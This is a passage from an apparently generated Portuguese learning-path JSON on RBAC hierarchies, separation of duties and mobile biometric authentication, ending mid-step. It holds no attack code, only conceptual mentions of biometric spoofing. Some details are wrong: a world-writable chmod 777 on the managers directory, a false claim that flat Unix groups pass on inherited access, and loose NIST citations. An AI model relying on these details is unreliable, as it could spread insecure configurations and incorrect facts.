                        "specificSkills": [
                          {
                            "id": "10.1.6.6.3.1",
                            "name": "Implementar hierarquias de roles",
                            "description": "Configurar heranças onde roles seniores incorporam permissões de roles juniores, reduzindo redundâncias em sistemas operacionais como herança de grupos no Unix.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Fundamentos de Hierarquias de Roles em RBAC",
                                  "subSteps": [
                                    "Estude o conceito de Role-Based Access Control (RBAC) e hierarquias, onde roles seniores herdam permissões de roles juniores.",
                                    "Analise exemplos como grupos no Unix/Linux, onde adicionar um usuário a um grupo senior concede permissões do grupo junior automaticamente.",
                                    "Identifique benefícios: redução de redundâncias, simplicidade na gestão e escalabilidade.",
                                    "Revise restrições comuns, como herança parcial ou ativação condicional de roles.",
                                    "Compare com sistemas sem hierarquia para entender overhead de manutenção."
                                  ],
                                  "verification": "Resuma em um diagrama os conceitos de herança e liste 3 benefícios com exemplos.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Documentação RBAC NIST SP 800-53",
                                    "Man pages: man group(5), man useradd(8)",
                                    "Linux VM ou container (Docker)"
                                  ],
                                  "tips": "Use diagramas UML para visualizar herança de roles como classes em OOP.",
                                  "learningObjective": "Explicar como hierarquias reduzem redundâncias em permissões de acesso.",
                                  "commonMistakes": [
                                    "Confundir herança com agregação de roles",
                                    "Ignorar overhead de herança em roles complexos",
                                    "Assumir herança bidirecional"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Projetar uma Hierarquia de Roles para um Cenário Específico",
                                  "subSteps": [
                                    "Defina um cenário: empresa com roles 'operator' (read/write /data/operators), 'supervisor' (herda operator + read /data/supervisors), 'manager' (herda supervisor + full /data/managers).",
                                    "Crie um diagrama de herança: manager > supervisor > operator.",
                                    "Liste permissões únicas por role e permissões herdadas.",
                                    "Defina usuários de teste: user_op, user_sup, user_mgr.",
                                    "Planeje verificações: confirme que user_mgr acessa tudo sem duplicação de grupos."
                                  ],
                                  "verification": "Produza um diagrama e tabela de permissões exportável (ex: Markdown ou Draw.io).",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Ferramenta de diagrama (Draw.io, Lucidchart)",
                                    "Papel e caneta para rascunho",
                                    "Editor de texto para tabela"
                                  ],
                                  "tips": "Comece com hierarquias rasas (2-3 níveis) para evitar complexidade inicial.",
                                  "learningObjective": "Projetar hierarquias que minimizem redundâncias e suportem escalabilidade.",
                                  "commonMistakes": [
                                    "Definir permissões duplicadas em roles seniores",
                                    "Ignorar conflitos de herança",
                                    "Não mapear usuários aos roles corretos"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementar Hierarquia Usando Grupos no Unix/Linux",
                                  "subSteps": [
                                    "Crie diretórios: mkdir -p /data/{operators,supervisors,managers}; chown root: /data/*.",
                                    "Configure permissões base: chmod 775 /data/operators; chmod 755 /data/supervisors; chmod 777 /data/managers.",
                                    "Crie grupos: groupadd operator; groupadd supervisor; groupadd manager.",
                                    "Adicione herança simulada: Crie usuários e adicione user_op a operator; user_sup a supervisor e operator; user_mgr a manager, supervisor e operator.",
                                    "Aplique grupos aos usuários: usermod -aG operator user_op; etc. Para todos.",
                                    "Reinicie sessão ou use newgrp para ativar grupos."
                                  ],
                                  "verification": "Execute ls -ld /data/* e su - user_mgr para confirmar acessos herdados.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Linux VM (Ubuntu/Debian)",
                                    "Comandos: groupadd, usermod, chmod, newgrp",
                                    "Editor: nano/vim"
                                  ],
                                  "tips": "Use -aG para append grupos sem remover existentes; teste com su - <user> para simular login.",
                                  "learningObjective": "Configurar herança prática de permissões via grupos no Unix.",
                                  "commonMistakes": [
                                    "Esquecer -a em usermod (sobrescreve grupos)",
                                    "Não reiniciar sessão (grupos não ativam)",
                                    "Permissões erradas em diretórios pai"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar, Validar e Otimizar a Hierarquia",
                                  "subSteps": [
                                    "Teste acessos: Como cada usuário, tente touch, cat, rm em cada /data/*.",
                                    "Verifique herança: Confirme user_mgr acessa operators sem grupo explícito extra.",
                                    "Meça redução de redundâncias: Conte permissões definidas vs. totais.",
                                    "Simule falha: Remova user_mgr de operator e confirme acesso via supervisor.",
                                    "Otimize: Crie script para automação e documente em README.",
                                    "Audite logs: tail /var/log/auth.log para acessos negados."
                                  ],
                                  "verification": "Registre resultados em tabela: usuário x ação x resultado esperado vs. real.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Script bash de teste",
                                    "Ferramentas: id <user>, groups <user>",
                                    "Logs: /var/log/auth.log"
                                  ],
                                  "tips": "Automatize testes com script: for user in ...; do su - $user -c 'touch /data/test' ; done.",
                                  "learningObjective": "Validar implementação e quantificar benefícios de herança.",
                                  "commonMistakes": [
                                    "Testar sem login completo (su -)",
                                    "Ignorar umask ou ACLs interferentes",
                                    "Não auditar logs de falhas"
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma empresa de TI, implemente roles: 'developer' (git push/pull repo/dev), 'lead-dev' (herda developer + approve PRs), 'cto' (herda lead-dev + full admin). No Linux, use grupos dev, lead-dev (com setgid), cto. Adicione dev-lead a dev e cto; teste: cto aprova PR sem acesso direto duplicado.",
                              "finalVerifications": [
                                "Explicar verbalmente como herança reduz redundâncias com diagrama.",
                                "Configurar hierarquia em VM Linux sem erros de permissão.",
                                "Demonstrar acesso senior incluindo permissões junior via 'id' e testes de arquivo.",
                                "Identificar e corrigir uma falha de herança simulada.",
                                "Quantificar economia: 'roles definem 5 perms únicas vs 15 sem herança'.",
                                "Documentar setup em script reproduzível."
                              ],
                              "assessmentCriteria": [
                                "Precisão no design: Hierarquia correta sem redundâncias (90%+).",
                                "Implementação funcional: Todos testes de acesso passam (100%).",
                                "Eficiência: Redução mensurável de configurações duplicadas.",
                                "Documentação clara: Diagrama, tabela e script completos.",
                                "Tratamento de erros: Identifica e corrige 3+ common mistakes.",
                                "Escalabilidade: Design suporta +1 role sem refatoração total."
                              ],
                              "crossCurricularConnections": [
                                "Administração de Sistemas: Gerenciamento de usuários/grupos em Linux/Windows AD.",
                                "Programação: Herança em OOP (Python classes) similar a roles.",
                                "Redes e Cloud: IAM hierarchies no AWS/Azure para políticas.",
                                "Auditoria e Compliance: Mapeamento para SC-07 NIST e SOX controls.",
                                "Automação: Scripting Ansible para deploy de RBAC."
                              ],
                              "realWorldApplication": "Em data centers empresariais, hierarquias de roles em Active Directory ou LDAP reduzem tempo de onboarding de semanas para horas, minimizando riscos de over-privileging em equipes de 1000+ usuários, como no setor financeiro para conformidade PCI-DSS."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.6.6.1.2"
                            ]
                          },
                          {
                            "id": "10.1.6.6.3.2",
                            "name": "Aplicar separação de deveres (SoD)",
                            "description": "Definir restrições mutuamente exclusivas para roles, impedindo que um usuário acumule roles conflitantes, como aprovação e execução de transações.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os Conceitos Fundamentais de Separação de Deveres (SoD)",
                                  "subSteps": [
                                    "Estude a definição de SoD: restrições mutuamente exclusivas entre roles para evitar acumulação de poderes conflitantes.",
                                    "Analise exemplos clássicos, como aprovação e execução de transações financeiras.",
                                    "Diferencie SoD de outros princípios RBAC, como least privilege e hierarquias de roles.",
                                    "Revise normas como NIST SP 800-53 (AC-6) relacionadas a SoD.",
                                    "Crie um diagrama simples ilustrando roles conflitantes."
                                  ],
                                  "verification": "Explique em suas palavras o que é SoD e forneça um exemplo de conflito de roles resolvido por ela.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Documentação NIST SP 800-53",
                                    "Artigos sobre RBAC e SoD",
                                    "Ferramenta de diagramação como Draw.io"
                                  ],
                                  "tips": "Use analogias do mundo real, como 'quatro olhos' (four-eyes principle), para fixar o conceito.",
                                  "learningObjective": "Dominar os fundamentos teóricos da SoD e sua importância na prevenção de fraudes internas.",
                                  "commonMistakes": [
                                    "Confundir SoD com segregação de funções em processos de negócio",
                                    "Ignorar o impacto em hierarquias de roles",
                                    "Subestimar conflitos indiretos via sub-roles"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar Roles e Conflitos Potenciais no Sistema",
                                  "subSteps": [
                                    "Liste todos os roles existentes no sistema RBAC alvo.",
                                    "Mapeie permissões associadas a cada role e identifique sobreposições perigosas.",
                                    "Consulte stakeholders para validar riscos reais, como em aprovações financeiras.",
                                    "Crie uma matriz de conflitos: roles em linhas e colunas, marcando pares exclusivos.",
                                    "Priorize conflitos de alto risco com base em impacto (ex.: financeiro, confidencialidade)."
                                  ],
                                  "verification": "Apresente uma matriz de conflitos com pelo menos 5 pares identificados e justificados.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Lista de roles do sistema",
                                    "Planilha Excel ou Google Sheets",
                                    "Documentos de requisitos de segurança"
                                  ],
                                  "tips": "Envolva equipes de negócio cedo para garantir relevância prática dos conflitos.",
                                  "learningObjective": "Desenvolver habilidade para mapear e priorizar riscos de acumulação de roles.",
                                  "commonMistakes": [
                                    "Focar apenas em conflitos óbvios",
                                    "Ignorar herança de roles em hierarquias",
                                    "Não considerar cenários dinâmicos de atribuição"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Definir Regras de Restrições Mutuamente Exclusivas (SoD Rules)",
                                  "subSteps": [
                                    "Especifique regras SoD como pares de roles proibidos (ex.: {Aprovar, Executar}).",
                                    "Defina exceções gerenciadas, como aprovações administrativas temporárias.",
                                    "Formalize as regras em pseudocódigo ou linguagem de política RBAC.",
                                    "Valide regras com cenários de teste hipotéticos.",
                                    "Documente as regras em um policy file acessível para auditoria."
                                  ],
                                  "verification": "Forneça um conjunto de 3-5 regras SoD em formato legível e valide com um exemplo de violação.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Editor de texto ou IDE",
                                    "Templates de políticas RBAC",
                                    "Ferramentas como XACML para modelagem"
                                  ],
                                  "tips": "Use notação formal como 'roleA mutually_exclusive roleB' para clareza.",
                                  "learningObjective": "Criar definições precisas e auditáveis de restrições SoD.",
                                  "commonMistakes": [
                                    "Definir regras muito rígidas que bloqueiam operações legítimas",
                                    "Esquecer de propagar restrições em heranças de roles",
                                    "Não documentar justificativas de risco"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Implementar, Testar e Auditar a SoD no RBAC",
                                  "subSteps": [
                                    "Integre as regras SoD no engine RBAC (ex.: usando bibliotecas como PyRbac ou Keycloak).",
                                    "Teste atribuições: tente atribuir roles conflitantes e verifique bloqueio.",
                                    "Execute auditorias simuladas para detectar violações existentes.",
                                    "Configure alertas para tentativas de violação.",
                                    "Revise e refine com base nos resultados de testes."
                                  ],
                                  "verification": "Demonstre uma tentativa falha de atribuição conflitante e confirme logs de auditoria.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "Ambiente de teste RBAC (Docker/Keycloak)",
                                    "Scripts de teste automatizados",
                                    "Ferramentas de logging como ELK Stack"
                                  ],
                                  "tips": "Sempre teste em ambiente sandbox antes de produção para evitar disrupções.",
                                  "learningObjective": "Aplicar SoD de forma prática e verificável em um sistema real.",
                                  "commonMistakes": [
                                    "Não testar cenários edge cases",
                                    "Ignorar performance de verificações em escala",
                                    "Falhar em configurar monitoramento contínuo"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um sistema bancário, defina SoD para roles 'Aprovar Transação > R$10k' e 'Executar Pagamento'. Ao tentar atribuir ambos a um usuário, o sistema bloqueia com erro: 'Violação de Separação de Deveres detectada'. Teste: Usuário A aprova, usuário B executa.",
                              "finalVerifications": [
                                "Pode explicar SoD e listar 3 exemplos de conflitos comuns?",
                                "Conseguiu criar e validar uma matriz de conflitos para um sistema simulado?",
                                "Implementou regras SoD que bloqueiam corretamente atribuições conflitantes?",
                                "Gerou relatórios de auditoria sem violações residuais?",
                                "Identificou e corrigiu um erro comum em um teste prático?",
                                "Relacionou SoD a normas como NIST ou ISO 27001?"
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de pelo menos 80% dos conflitos reais (rubrica de matriz).",
                                "Regras SoD formalizadas, testadas e sem ambiguidades (código legível).",
                                "Implementação funcional com taxa de detecção de violações >95%.",
                                "Documentação completa com justificativas de risco e exceções.",
                                "Tempo de execução dentro do estimado e sem erros críticos.",
                                "Criatividade em conexões interdisciplinares e aplicações reais."
                              ],
                              "crossCurricularConnections": [
                                "Gestão de Riscos: Integração com frameworks como COSO para controles internos.",
                                "Auditoria e Compliance: Alinhamento com SOX, GDPR e normas de governança.",
                                "Ética Profissional: Prevenção de conflitos de interesse em TI.",
                                "Desenvolvimento de Software: Design de políticas em DevSecOps.",
                                "Administração de Sistemas: Monitoramento em SIEM e IAM."
                              ],
                              "realWorldApplication": "Em bancos como Itaú ou Bradesco, SoD previne fraudes internas ao impedir que o mesmo analista aprove e execute transferências, reduzindo riscos regulatórios e perdas financeiras em milhões; aplicado também em governos para controle de licitações públicas."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.6.6.2.1"
                            ]
                          }
                        ]
                      }
                    ]
                  }
                ]
              },
              {
                "id": "10.1.7",
                "name": "Segurança em Computação Móvel",
                "description": "Aborda aspectos de segurança em ambientes de computação móvel.",
                "totalSkills": 49,
                "atomicTopics": [
                  {
                    "id": "10.1.7.1",
                    "name": "Autenticação e Autorização em Dispositivos Móveis",
                    "description": "Métodos de autenticação como biometria, PIN e tokens, e controle de acesso em plataformas móveis.",
                    "individualConcepts": [
                      {
                        "id": "10.1.7.1.1",
                        "name": "Métodos de Autenticação Biométrica em Dispositivos Móveis",
                        "description": "Exploração dos mecanismos de autenticação baseados em características biológicas únicas do usuário, como impressão digital, reconhecimento facial e de íris, implementados em plataformas móveis para garantir identidade segura.",
                        "specificSkills": [
                          {
                            "id": "10.1.7.1.1.1",
                            "name": "Identificar tipos de biometria móvel",
                            "description": "Diferenciar e descrever os principais tipos de autenticação biométrica utilizados em dispositivos móveis, incluindo impressão digital (Touch ID/Fingerprint), reconhecimento facial (Face ID) e autenticação de voz, destacando suas aplicações em Android e iOS.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os Conceitos Fundamentais de Biometria em Dispositivos Móveis",
                                  "subSteps": [
                                    "Defina biometria e explique por que é usada em autenticação móvel.",
                                    "Liste os principais tipos de biometria móvel: impressão digital, reconhecimento facial e autenticação de voz.",
                                    "Descreva os benefícios gerais, como conveniência e segurança.",
                                    "Identifique limitações comuns, como falsos positivos ou condições ambientais.",
                                    "Pesquise estatísticas básicas sobre adoção de biometria em smartphones."
                                  ],
                                  "verification": "Crie um mapa mental ou tabela resumindo conceitos, tipos e benefícios/limitações.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Acesso à internet",
                                    "Notebook ou papel para anotações",
                                    "Vídeos introdutórios sobre biometria (YouTube ou Khan Academy)"
                                  ],
                                  "tips": "Use analogias cotidianas, como comparar biometria a uma 'chave única do corpo', para fixar o conceito.",
                                  "learningObjective": "Entender os fundamentos e importância da biometria móvel.",
                                  "commonMistakes": [
                                    "Confundir biometria com senhas tradicionais",
                                    "Ignorar limitações como falhas em ambientes úmidos"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar Impressão Digital (Touch ID/Fingerprint)",
                                  "subSteps": [
                                    "Descreva como o sensor capta a impressão digital em iOS (Touch ID) e Android (Fingerprint).",
                                    "Explique o processo: captura, hashing e comparação com template armazenado.",
                                    "Compare implementações: iOS usa Secure Enclave, Android usa Trusted Execution Environment.",
                                    "Teste em um dispositivo real: configure e use o fingerprint.",
                                    "Registre cenários de uso, como desbloqueio e apps bancários."
                                  ],
                                  "verification": "Demonstre configurando fingerprint em um smartphone e explique o fluxo verbalmente.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Smartphone iOS ou Android",
                                    "Apps de teste como banco ou gerenciador de senhas"
                                  ],
                                  "tips": "Limpe bem os dedos antes de testar para evitar falhas de leitura.",
                                  "learningObjective": "Diferenciar e descrever o funcionamento da impressão digital em plataformas móveis.",
                                  "commonMistakes": [
                                    "Achar que o fingerprint é armazenado como imagem raw",
                                    "Não notar diferenças entre iOS e Android"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Investigar Reconhecimento Facial (Face ID)",
                                  "subSteps": [
                                    "Explique a tecnologia: TrueDepth camera no iOS (Face ID) vs. face unlock no Android.",
                                    "Detalhe o mapeamento 3D: infravermelho, projetor de pontos e motor neural.",
                                    "Discuta segurança: Face ID usa modelo matemático 3D, Android varia por device.",
                                    "Teste em dispositivo: configure Face ID e teste com fotos ou gêmeos.",
                                    "Anote aplicações: pagamentos Apple Pay e autenticação em apps."
                                  ],
                                  "verification": "Grave um vídeo curto testando Face ID e explicando por que fotos não funcionam.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "iPhone com Face ID ou Android com face unlock avançado",
                                    "Ambiente com pouca luz para testes"
                                  ],
                                  "tips": "Use máscara ou óculos durante testes para ver limitações reais.",
                                  "learningObjective": "Dominar o reconhecimento facial, suas tecnologias e diferenças entre iOS/Android.",
                                  "commonMistakes": [
                                    "Confundir Face ID básico do Android com o avançado",
                                    "Subestimar a necessidade de 3D mapping"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar Autenticação de Voz e Comparações",
                                  "subSteps": [
                                    "Descreva como funciona: análise de voz via machine learning em assistentes como Siri/Google Assistant.",
                                    "Compare com outros: voz é behavioral, menos precisa em ruído.",
                                    "Liste apps: autenticação em banking voice ou smart home.",
                                    "Crie uma tabela comparativa: precisão, velocidade, vulnerabilidades por tipo.",
                                    "Debata prós/contras em iOS vs. Android."
                                  ],
                                  "verification": "Apresente a tabela comparativa e responda perguntas sobre diferenças.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Planilha Google Sheets ou Excel",
                                    "Gravações de voz para testes simulados"
                                  ],
                                  "tips": "Fale em diferentes tons/velocidades para simular testes de voz.",
                                  "learningObjective": "Identificar e comparar autenticação de voz com outros tipos biométricos.",
                                  "commonMistakes": [
                                    "Achar voz tão segura quanto fingerprint",
                                    "Ignorar dependência de áudio claro"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Sintetizar e Aplicar Conhecimento",
                                  "subSteps": [
                                    "Revise todos os tipos e crie fluxograma de seleção por cenário.",
                                    "Simule cenários: escolha biometria para app de saúde vs. banking.",
                                    "Pesquise casos reais de falhas (ex: fingerprint molhado).",
                                    "Discuta evoluções futuras como biometria multimodal.",
                                    "Autoavalie com quiz interno."
                                  ],
                                  "verification": "Crie e compartilhe um fluxograma ou quiz respondido corretamente.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Ferramenta de fluxograma como Draw.io",
                                    "Quiz online sobre biometria"
                                  ],
                                  "tips": "Priorize biometria por contexto: facial para velocidade, fingerprint para precisão.",
                                  "learningObjective": "Integrar conhecimentos para identificar e diferenciar tipos em contextos reais.",
                                  "commonMistakes": [
                                    "Não considerar privacidade/dados biométricos",
                                    "Generalizar vulnerabilidades sem exemplos"
                                  ]
                                }
                              ],
                              "practicalExample": "Configure autenticação biométrica em um smartphone Android e iOS simulados (usando emuladores ou devices reais): adicione fingerprint para desbloqueio, Face ID para Apple Pay e voz para assistente virtual, testando em cenários como login em app bancário sob chuva simulada.",
                              "finalVerifications": [
                                "Liste e descreva com precisão os três tipos principais de biometria móvel.",
                                "Explique diferenças técnicas entre iOS e Android para cada tipo.",
                                "Identifique pelo menos duas vulnerabilidades por tipo.",
                                "Crie uma tabela comparativa correta.",
                                "Demonstre configuração prática em um device.",
                                "Responda corretamente a um quiz de 10 perguntas sobre o tópico."
                              ],
                              "assessmentCriteria": [
                                "Precisão na descrição de tecnologias (ex: Secure Enclave, TrueDepth).",
                                "Capacidade de diferenciar implementações iOS vs. Android.",
                                "Uso de exemplos práticos e verificáveis.",
                                "Análise equilibrada de prós, contras e aplicações.",
                                "Criatividade na tabela/fluxograma comparativo.",
                                "Compreensão de limitações reais e segurança."
                              ],
                              "crossCurricularConnections": [
                                "Biologia: Anatomia de impressões digitais e estruturas faciais.",
                                "Matemática: Algoritmos de hashing e machine learning para matching.",
                                "Física: Sensores ópticos, infravermelho e ondas sonoras.",
                                "Ética/Privacidade: Debates sobre dados biométricos e GDPR.",
                                "Desenvolvimento de Software: Integração de APIs biométricas em apps."
                              ],
                              "realWorldApplication": "Em apps bancários móveis (ex: Nubank ou Caixa), biometria impede fraudes; em saúde (ex: telemedicina), autentica pacientes; em empresas, protege acesso corporativo, reduzindo senhas e aumentando segurança em 90% segundo estudos NIST."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.7.1.1.2",
                            "name": "Analisar vantagens e limitações da biometria",
                            "description": "Avaliar as vantagens como conveniência e resistência a ataques de shoulder surfing, e limitações como falsos positivos/negativos, vulnerabilidades a spoofing (ex.: máscaras ou impressões falsas) e questões de privacidade de dados biométricos.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os Fundamentos da Biometria",
                                  "subSteps": [
                                    "Defina biometria e liste os tipos comuns (impressão digital, reconhecimento facial, íris, voz).",
                                    "Explique como a biometria funciona em dispositivos móveis (sensores e algoritmos de matching).",
                                    "Compare biometria com autenticação tradicional (senhas, PINs).",
                                    "Identifique componentes chave: captura, extração de características e comparação.",
                                    "Pesquise estatísticas de uso de biometria em smartphones."
                                  ],
                                  "verification": "Crie um diagrama simples do processo de autenticação biométrica e liste 4 tipos com exemplos.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Acesso à internet",
                                    "Vídeos tutoriais sobre biometria (YouTube/Khan Academy)",
                                    "Papel e caneta para diagrama"
                                  ],
                                  "tips": "Use analogias cotidianas, como comparar biometria a uma impressão digital única como uma assinatura pessoal.",
                                  "learningObjective": "Entender os conceitos básicos e funcionamento da biometria para contextualizar vantagens e limitações.",
                                  "commonMistakes": [
                                    "Confundir biometria com autenticação multifator",
                                    "Ignorar diferenças entre tipos de biometria"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar Vantagens da Biometria",
                                  "subSteps": [
                                    "Liste vantagens como conveniência (rápida e sem memorização).",
                                    "Discuta resistência a shoulder surfing (não visível como PIN).",
                                    "Avalie segurança contra roubo de credenciais (dificuldade de falsificação).",
                                    "Pesquise casos reais onde biometria melhorou a usabilidade em apps móveis.",
                                    "Classifique vantagens por tipo de biometria (ex.: facial mais rápida que digital)."
                                  ],
                                  "verification": "Escreva um parágrafo resumindo 3 vantagens principais com exemplos de dispositivos móveis.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Artigos acadêmicos ou sites como NIST sobre biometria",
                                    "Smartphone para testar autenticação biométrica pessoal"
                                  ],
                                  "tips": "Pense em cenários diários: desbloqueio de celular em público sem expor PIN.",
                                  "learningObjective": "Identificar e justificar as principais vantagens da biometria em contextos móveis.",
                                  "commonMistakes": [
                                    "Superestimar invulnerabilidade sem considerar contexto",
                                    "Ignorar trade-offs com usabilidade"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Investigar Limitações Técnicas da Biometria",
                                  "subSteps": [
                                    "Explique falsos positivos (aceita intruso) e falsos negativos (rejeita usuário legítimo).",
                                    "Descreva vulnerabilidades a spoofing (máscaras, impressões digitais falsas, fotos para facial).",
                                    "Analise fatores ambientais (sujeira, iluminação, lesões).",
                                    "Pesquise taxas de erro (FAR/FRR) para tipos comuns de biometria.",
                                    "Compare spoofing em biometria vs. phishing em senhas."
                                  ],
                                  "verification": "Crie uma tabela comparando 3 limitações técnicas com exemplos e taxas de erro aproximadas.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "Relatórios de segurança (ex.: papers do IEEE)",
                                    "Vídeos de demonstrações de spoofing biométrico"
                                  ],
                                  "tips": "Teste seu próprio dispositivo: cubra o sensor ou use foto para ver falhas.",
                                  "learningObjective": "Avaliar riscos técnicos e métodos de ataque à biometria.",
                                  "commonMistakes": [
                                    "Subestimar spoofing low-tech como goma de mascar para digitais",
                                    "Confundir FAR com FRR"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Avaliar Limitações de Privacidade e Sintetizar Análise",
                                  "subSteps": [
                                    "Discuta privacidade: armazenamento de templates biométricos e riscos de vazamento.",
                                    "Aborde questões éticas (consentimento, uso indevido por governos).",
                                    "Compare biometria com senhas em termos de revocabilidade (biometria não pode ser alterada).",
                                    "Sintetize prós e contras em uma matriz de decisão.",
                                    "Proponha mitigações como liveness detection ou criptografia de templates."
                                  ],
                                  "verification": "Redija um relatório de 1 página com matriz de vantagens vs. limitações e recomendações.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Leis de privacidade (GDPR, LGPD)",
                                    "Ferramentas de diagrama como Draw.io"
                                  ],
                                  "tips": "Pergunte: 'E se meus dados biométricos forem roubados? Posso mudar minha face?'",
                                  "learningObjective": "Integrar aspectos de privacidade e formular uma análise equilibrada.",
                                  "commonMistakes": [
                                    "Ignorar revocabilidade como fraqueza única",
                                    "Focar só em técnica sem ética"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um smartphone Android/iOS, analise o desbloqueio facial: teste conveniência (rápido), shoulder surfing (seguro em público), mas spoofe com foto (limitação) e discuta privacidade do Face ID armazenado no Secure Enclave.",
                              "finalVerifications": [
                                "Explique 3 vantagens e 3 limitações com exemplos reais.",
                                "Diferencie falsos positivos de falsos negativos com taxas hipotéticas.",
                                "Descreva um ataque de spoofing e como mitigá-lo.",
                                "Discuta impacto na privacidade e revocabilidade.",
                                "Crie uma matriz prós/contras para biometria vs. PIN.",
                                "Identifique quando usar biometria em apps móveis."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de vantagens (conveniência, anti-shoulder surfing).",
                                "Profundidade na análise de limitações técnicas (spoofing, erros FAR/FRR).",
                                "Cobertura de privacidade e ética com exemplos.",
                                "Uso de evidências reais (estudos, casos).",
                                "Síntese equilibrada em matriz ou relatório.",
                                "Clareza e estrutura na comunicação."
                              ],
                              "crossCurricularConnections": [
                                "Ética e Direito: Privacidade de dados (LGPD/GDPR).",
                                "Biologia: Anatomia humana e características únicas.",
                                "Matemática: Probabilidades de erro (FAR/FRR).",
                                "Tecnologia: Criptografia e hardware seguro.",
                                "Sociologia: Impacto social de vigilância biométrica."
                              ],
                              "realWorldApplication": "Em aeroportos (reconhecimento facial para embarque rápido, mas com riscos de spoofing e privacidade); bancos móveis (autenticação para transações seguras sem senhas roubáveis); empresas (controle de acesso físico, equilibrando conveniência com conformidade regulatória)."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.7.1.1.3",
                            "name": "Configurar autenticação biométrica em plataformas móveis",
                            "description": "Demonstrar passos para habilitar e gerenciar autenticação biométrica em dispositivos Android (BiometricPrompt API) e iOS (LocalAuthentication framework), incluindo integração em aplicativos.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar o ambiente de desenvolvimento para Android",
                                  "subSteps": [
                                    "Instale o Android Studio e configure um emulador com suporte a biometria (use AVD com fingerprint).",
                                    "Adicione a dependência BiometricPrompt no build.gradle: implementation 'androidx.biometric:biometric:1.1.0'.",
                                    "Configure o manifesto AndroidManifest.xml para permissões de USE_BIOMETRIC e USE_FINGERPRINT.",
                                    "Crie um projeto de app simples com uma tela de login.",
                                    "Teste o emulador configurando uma impressão digital falsa nas configurações do dispositivo."
                                  ],
                                  "verification": "Projeto compila sem erros e emulador reconhece biometria nas configurações do dispositivo.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Android Studio",
                                    "Emulador Android com API 28+",
                                    "Documentação oficial BiometricPrompt"
                                  ],
                                  "tips": "Use o emulador com 'Fingerprint' configurado para simular autenticação sem hardware real.",
                                  "learningObjective": "Configurar corretamente o ambiente para desenvolvimento de biometria no Android.",
                                  "commonMistakes": [
                                    "Esquecer de adicionar permissões no manifesto",
                                    "Usar API level inferior a 28",
                                    "Não configurar fingerprint no emulador"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Implementar BiometricPrompt API no Android",
                                  "subSteps": [
                                    "Crie uma classe helper para gerenciar BiometricPrompt.",
                                    "No botão de login, inicialize BiometricPrompt com PromptInfo (título, descrição, ícone).",
                                    "Implemente o callback AuthenticationCallback para onAuthenticationSucceeded, onAuthenticationFailed e onError.",
                                    "Armazene token seguro no EncryptedSharedPreferences após sucesso.",
                                    "Integre na Activity principal com Executor para thread principal."
                                  ],
                                  "verification": "Ao clicar no botão de login, o prompt biométrico aparece e autentica com fingerprint simulada.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Código fonte de exemplo da documentação Android",
                                    "Postman para testar APIs se integrado"
                                  ],
                                  "tips": "Sempre verifique se o dispositivo suporta biometria com BiometricManager.from(context).canAuthenticate().",
                                  "learningObjective": "Desenvolver autenticação biométrica funcional usando BiometricPrompt no Android.",
                                  "commonMistakes": [
                                    "Não tratar fallback para PIN/senha",
                                    "Executar autenticação na UI thread",
                                    "Ignorar erros de disponibilidade de hardware"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
